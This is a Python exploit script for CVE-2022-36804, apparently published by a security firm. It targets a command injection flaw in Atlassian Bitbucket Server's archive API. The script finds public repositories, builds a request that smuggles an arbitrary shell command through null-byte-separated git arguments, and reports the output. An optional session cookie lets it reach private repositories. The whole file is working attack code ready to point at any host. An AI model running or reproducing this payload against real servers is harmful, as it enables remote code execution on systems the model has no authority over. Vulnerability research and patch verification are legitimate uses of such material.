'''
CVE: 2022-36804
Tested on: Bitbucket Server 7.17.1
Description: A critical command injection vulnerability was found in multiple API endpoints of the Atlassian Bitbucket Server and Data center.
Script Author: @nirav4peace
Company: Walnut Security Services Pvt. Ltd.
Website: https://walnutsecurity.com
'''

import re
import sys
import requests
import argparse
import urllib.parse

# User-Agent
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"

# Usage Instructions
usage = "\n[!] cve-2022-36804.py -u domain.com --check\n[!] cve-2022-36804.py -u domain.com -p ProjectKey -r RepoName"
description = "[!] CVE-2021-36804.py is a python script to exploit Remote Code Execution (RCE) vulnerability in Bitbucket <7.6.17, <7.17.10, <7.21.4, <8.0.3, <8.1.2, <8.2.2, and <8.3.1. This script is tested on version 7.17.1"

# Arguments Parser
parser = argparse.ArgumentParser(usage=usage, description=description)
parser.add_argument("-u", dest="url", type=str, required=True, help="Specify a domain/ip to scan for CVE-2022-36804")
parser.add_argument("-p", dest="projkey", type=str, help="Specify a project key")
parser.add_argument("-r", dest="repokey", type=str, help="Specify a repository name")
parser.add_argument("-c", dest="cmd", help="Specify system command like id, whoami, ifconfig, etc.")
parser.add_argument("--session", dest="session", type=str, help="Specify 'BITBUCKETSESSIONID' cookie to access private repository. Here, projkey[-p] and reponame[-r] is must.")
args = parser.parse_args()

# Check for valid URL format and connectivity
def urlCheck(url):
    try:
        try:
            try:
                try:
                    try:
                        requests.head(url, headers={"User-Agent": user_agent})
                    except requests.exceptions.InvalidURL:
                        print ("\n[-] Provided URL is invalid. Please specify valid URL.\n")
                        sys.exit()
                except requests.exceptions.InvalidSchema:
                    print ("\n[-] You have provided wrong protocol in "+url+", it must be (http:// or https://)\n")
                    sys.exit()
            except requests.exceptions.MissingSchema:
                print ("\n[-] You need to specify protocol (http:// or https://) in "+url+"\n")
                sys.exit()
        except requests.exceptions.ReadTimeout:
            print ("\n[-] Server has not responded within 10s for the domain/ip "+url+"\n")
            sys.exit()
    except requests.exceptions.ConnectionError:
        print ("\n[-] Unable to connect to the domain or ip "+url+"\n")
        sys.exit()
        
# Send exploit request
def main_exploit(exploit_url):
    print ("[!] Sending payload")
    response = requests.get(exploit_url,headers={"User-Agent": user_agent, "Cookie": "BITBUCKETSESSIONID={}".format(args.session)})
    resp_text = response.text
    if "com.atlassian.bitbucket.repository.NoSuchRepositoryException" in resp_text:
        print("[-] Check projkey or repokey again. No private repository found.")
    elif "An error occurred while processing the request" in resp_text:
        print ("[-] Bitbucket server is not vulnerable with CVE-2022-36804.")
    else:
        string = re.search("'origin/': 1:(.*): not found", resp_text).group(1)
        print ("[+] Bitbucket server is vulnerable with CVE-2022-36804")
        print ("[+] Response: "+string)

# Parameters to run the exploit
def exploit(url, cmd, projkey, repokey):
    urlCheck(url)
    if (projkey and repokey) == None:
        fetch_public_repo = requests.get(url + "/repos?visibility=public").text
        search_string = "Public Repositories"
        if search_string in fetch_public_repo:
            find = re.split('"href":', fetch_public_repo)[-1]
            project_key = re.search(url+'/projects/(.*)/repos/', find).group(1)
            print ("[!] Project key found '"+project_key+"'")
            repo_name = re.search(url+'/projects/'+project_key+'/repos/(.*)/browse', find).group(1)
            print ("[!] Repository name found '"+repo_name+"'")
            exploit_url = url+"/rest/api/latest/projects/"+project_key+"/repos/"+repo_name+"/archive?filename=kiE0h&at=refs%2Fheads%2Fmaster&path=kiE0h&prefix=ax%00--exec=%60"+cmd+"%60%00--remote=origin"
            print ("[!] Command: "+cmd)
            print ("[!] Payload constructed")
            main_exploit(exploit_url)
        else:
            print ("[-] There are no Public Repository(ies) found.")
    else: #(projkey and repokey) != None:
        try:
            print ("[!] Project Key = "+args.projkey)
            print ("[!] Repository Name = "+args.repokey)
            exploit_url = url+"/rest/api/latest/projects/"+args.projkey+"/repos/"+args.repokey+"/archive?filename=kiE0h&at=refs%2Fheads%2Fmaster&path=kiE0h&prefix=ax%00--exec=%60"+cmd+"%60%00--remote=origin"
            print ("[!] Command: "+cmd)
            print ("[!] Payload constructed")
            main_exploit(exploit_url)
        except AttributeError:
            if args.session:
                print ("[!] Please verify projkey and repokey again.")
            else:
                print ("[!] Please verify projkey and repokey again. If this is a private repo than use --session to access the same.")

url = args.url
cmd = urllib.parse.quote(str(args.cmd))
projkey = args.projkey
repokey = args.repokey

if args.url:
    if args.cmd and not args.projkey and not args.repokey:
        exploit (url, cmd, None, None)
    elif args.projkey and args.repokey and not args.cmd:
        exploit (url, "whoami", projkey, repokey)
    elif args.cmd and args.projkey and args.repokey:
        exploit (url, cmd, projkey, repokey)
    elif (args.projkey and not args.repokey) or (args.repokey and not args.projkey):
        print ("[-] Please specify both projkey and repokey.")
    else:
        exploit(url, "whoami", None, None)
